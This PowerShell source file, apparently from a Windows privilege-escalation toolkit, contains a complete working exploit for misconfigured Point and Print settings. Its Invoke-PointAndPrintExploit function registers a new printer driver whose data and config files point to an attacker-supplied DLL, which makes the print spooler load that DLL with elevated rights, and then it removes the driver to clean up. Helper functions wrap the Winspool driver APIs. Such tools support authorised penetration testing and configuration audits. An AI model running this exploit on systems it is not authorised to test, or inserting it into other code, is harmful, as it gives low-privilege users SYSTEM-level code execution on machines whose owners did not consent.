function Invoke-PointAndPrintExploit {
    <#
    .SYNOPSIS
    Elevate privileges locally through a vulnerable Point and Print configuration.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION
    This cmdlet exploits a vulnerable Point and Print configuration by adding a printer driver using a custom DLL. When the exploit is complete, it also attempts to remove the printer driver and delete the copied DLL payload.
    
    .PARAMETER DllPath
    The full path of a DLL on the local file system.
    #>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({ [System.IO.Path]::IsPathRooted($_) })]
        [string] $DllPath
    )
    
    begin {
        $NewDriverName = [Guid]::NewGuid()
        $NewDriverDllPath = $null
        $NewDriverCreated = $false
    }
    
    process {
        Write-Host "[*] Enumerating printer drivers..."

        $DriverList = [object[]] (Get-WinspoolPrinterDriver -InfoLevel 2 -ErrorVariable LastError -ErrorAction SilentlyContinue)

        if ($null -eq $DriverList) { Write-Host "[-] Failed to enumerate printer drivers$(if ($LastError) { " ($LastError)"})."; return }
        
        Write-Host "[*] Found $($DriverList.Count) printer drivers."

        # For DLLs that are not in '%windir%\System32\DriverStore\FileRepository',
        # AddPrinterDriver seems to always fail with the error "The process cannot
        # access the file because it is being used by another process)", so we need
        # to filter out those drivers.
        $DriverList = [object[]] ($DriverList | Where-Object { $_.DriverPath -like "*FileRepository*" })
        $DriverIndex = Get-Random -Minimum 0 -Maximum $DriverList.Count
        $Driver = $DriverList[$DriverIndex]

        Write-Host "[*] Using printer driver '$($Driver.Name)' as a template..."

        $NewDriverInfo = New-Object $DRIVER_INFO_2
        $NewDriverInfo.Version = 3 # The operating system version for which the driver was written. The supported value is 3.
        $NewDriverInfo.Name = $NewDriverName
        $NewDriverInfo.Environment = $Driver.Environment
        $NewDriverInfo.DriverPath = $Driver.DriverPath
        $NewDriverInfo.DataFile = $DllPath
        $NewDriverInfo.ConfigFile = $DllPath

        Write-Host "[*] Attempting to create printer driver with name '$($NewDriverInfo.Name)'..."
    
        $NewDriverCreated = Add-WinspoolPrinterDriver -DriverInfo $NewDriverInfo -ErrorVariable LastError -ErrorAction SilentlyContinue

        if (-not $NewDriverCreated) { Write-Host "[-] Failed to create printer driver$(if ($LastError) { " ($LastError)"})."; return }

        Write-Host "[+] Printer driver created!"

        $NewDriver = Get-WinspoolPrinterDriver -InfoLevel 2 | Where-Object { $_.Name -eq $NewDriverName }
        if ($null -eq $NewDriver) { Write-Host "[-] New printer driver not found."; return }        

        $NewDriverDllPath = $NewDriver.DataFile

        Write-Host "[*] The payload DLL was copied to: $($NewDriverDllPath)"
    }
    
    end {
        if ($NewDriverCreated) {
            try { $Success = Remove-WinspoolPrinterDriver -DriverName "$($NewDriverName)" }
            catch { Write-Verbose $_ }
        }

        if ($NewDriverCreated -and (-not $Success)) { Write-Host "[!] Failed to delete printer driver." }

        if ($null -ne $NewDriverDllPath) {
            if (Test-Path -Path $NewDriverDllPath) {
                Write-Host "[-] Failed to delete payload DLL."
            }
            else {
                Write-Host "[*] The payload DLL was successfully deleted."
            }
        }
    }
}

function Get-WinspoolPrinterDriver {
    <#
    .SYNOPSIS
    List printer drivers.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION
    This cmdlet uses the EnumPrinterDrivers API to list the currently installed printer drivers.
    
    .PARAMETER Environment
    The name of the target environment. If null, the function uses the current environment of the caller.

    .PARAMETER InfoLevel
    The level of information to get for each driver entry. The default is 1 (i.e., name only).
    #>

    [CmdletBinding()]
    param (
        [ValidateSet("Windows x86", "Windows IA64", "Windows x64", "Windows NT R4000")]
        [String] $Environment = $null,

        [ValidateSet(1, 2, 3, 4, 5)]
        [UInt32] $InfoLevel = 1
    )
    
    begin {
        switch ($InfoLevel) {
            1 { $DriverInfoType = $DRIVER_INFO_1 }
            2 { $DriverInfoType = $DRIVER_INFO_2 }
            3 { $DriverInfoType = $DRIVER_INFO_3 }
            4 { $DriverInfoType = $DRIVER_INFO_4 }
            5 { $DriverInfoType = $DRIVER_INFO_5 }
        }
    }
    
    process {

        Write-Verbose "Info level: $($InfoLevel)"

        [UInt32] $BytesNeeded = 0
        [UInt32] $Count = 0
        $null = $Winspool::EnumPrinterDrivers($null, $Environment, $InfoLevel, [IntPtr]::Zero, 0, [ref]$BytesNeeded, [ref]$Count)
        if ($BytesNeeded -eq 0) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "EnumPrinterDrivers - $([ComponentModel.Win32Exception] $LastError)"
        }

        Write-Verbose "EnumPrinterDrivers OK - BytesNeeded: $($BytesNeeded)"
        
        [IntPtr] $BufferPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($BytesNeeded)
        
        $Success = $Winspool::EnumPrinterDrivers($null, "Windows x64", $InfoLevel, $BufferPtr, $BytesNeeded, [ref]$BytesNeeded, [ref]$Count)
        if (-not $Success) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "EnumPrinterDrivers - $([ComponentModel.Win32Exception] $LastError)"
        }

        Write-Verbose "EnumPrinterDrivers OK - Count: $($Count)"

        $CurrentEntryPtr = $BufferPtr

        for ($i = 0; $i -lt $Count; $i++) {

            $DriverEntry = [Runtime.InteropServices.Marshal]::PtrToStructure($CurrentEntryPtr, [type] $DriverInfoType)
            $Offset = [Runtime.InteropServices.Marshal]::SizeOf([type] $DriverInfoType)
            $CurrentEntryPtr = [IntPtr] ($CurrentEntryPtr.ToInt64() + $Offset)

            $DriverEntry
        }
    }
    
    end {
        if ($BufferPtr) { [Runtime.InteropServices.Marshal]::FreeHGlobal($BufferPtr) }
    }
}

function Add-WinspoolPrinterDriver {
    <#
    .SYNOPSIS
    Add a printer driver.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION
    This cmdlet uses the AddPrinterDriverEx API to add a custom printer driver.
    
    .PARAMETER DriverInfo
    An object representing a DRIVER_INFO structure.
    #>

    [CmdletBinding()]
    param (
        [object] $DriverInfo
    )
    
    begin {
        $DriverType = $DriverInfo.GetType()
        switch ($DriverType) {
            $DRIVER_INFO_2 { $InfoLevel = 2 }
            $DRIVER_INFO_3 { $InfoLevel = 3 }
            $DRIVER_INFO_4 { $InfoLevel = 4 }
            default { throw "Unhandled type: $($DriverType)" }
        }
        $FileCopyFlags = 0
    }
    
    process {
        $DriverInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($DriverInfo))
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($DriverInfo, $DriverInfoPtr, $false)

        $FileCopyFlags += $APD_FILE_COPY_FLAGS::APD_COPY_ALL_FILES
        $FileCopyFlags += $APD_FILE_COPY_FLAGS::APD_COPY_FROM_DIRECTORY
        $FileCopyFlags += $APD_FILE_COPY_FLAGS::APD_INSTALL_WARNED_DRIVER

        $Success = $Winspool::AddPrinterDriverEx($null, $InfoLevel, $DriverInfoPtr, $FileCopyFlags)
        if (-not $Success) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "AddPrinterDriverEx - $([ComponentModel.Win32Exception] $LastError)"
        }

        $Success
    }
}

function Remove-WinspoolPrinterDriver {
    <#
    .SYNOPSIS
    Remove a printer driver.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION
    This cmdlet uses the DeletePrinterDriverEx API to remove a printer driver.
    
    .PARAMETER Environment
    The name of the environment (e.g., "Windows x64"). If "null", the current system's environment is used.
    
    .PARAMETER DriverName
    The name of the printer driver to install.

    .NOTES
    The flag DPD_DELETE_UNUSED_FILES is used so that the service automatically deletes unused files when the printer driver is removed.
    #>
    
    [CmdletBinding()]
    param (
        [ValidateSet("Windows x86", "Windows IA64", "Windows x64", "Windows NT R4000")]
        [string] $Environment = $null,

        [string] $DriverName
    )

    begin {
        $DPD_DELETE_UNUSED_FILES = 1
    }
    
    process {
        $Success = $Winspool::DeletePrinterDriverEx($null, $Environment, $DriverName, $DPD_DELETE_UNUSED_FILES, 0)
        if (-not $Success) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "DeletePrinterDriverEx - $([ComponentModel.Win32Exception] $LastError)"
        }
        $Success
    }
}